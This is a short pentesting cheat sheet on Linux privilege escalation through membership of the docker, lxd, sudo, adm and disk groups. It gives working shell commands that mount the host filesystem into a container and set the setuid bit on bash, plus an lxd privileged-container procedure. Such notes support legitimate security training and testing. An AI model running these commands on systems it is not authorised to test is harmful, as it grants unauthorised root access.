- **tags:** #linux #privesc #groups
- ------------------
# Abusing Special Groups
 Groups are used to organize users and assign permissions to access system resources. Users can belong to one or more groups, and groups can have different levels of permissions to access system resources.
## Vulnerable examples
- `docker`or `lxd`
If a user is a member of one of those groups he can deploy a `container` and taking advantage of mounts he has now access to the entire file system in the container. Any change made in the container side will take immediate effect on the actual host.
```shell
# docker
docker pull debian:latest
docker run --rm -dit -v /:/mnt/root --name privesc debian
docker exec -it privesc bash
cd /mnt/root/bin
chmod u+s bash

#lxd
# Step 1: Download build-alpine => wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine [Attacker Machine]
# Step 2: Build alpine => bash build-alpine (as root user) [Attacker Machine]
lxc image import $filename --alias alpine && lxd init --auto                         
echo -e "[*] Listing images...\n" && lxc image list                                  
lxc init alpine privesc -c security.privileged=true                                  
lxc config device add privesc giveMeRoot disk source=/ path=/mnt/root recursive=true 
lxc start privesc                                                                    
lxc exec privesc sh                                                                  
```
- `sudo`
Any member of this group can execute commands as `root` providing the user password.
- `adm`
All members of this group have access to the system `logs`.
- `disk`
Users within the disk group have full access to any devices contained within `/dev`, such as `/dev/sda1`, which is typically the main device used by the operating system. An attacker with these privileges can use `debugfs` to access the entire file system with root level privileges.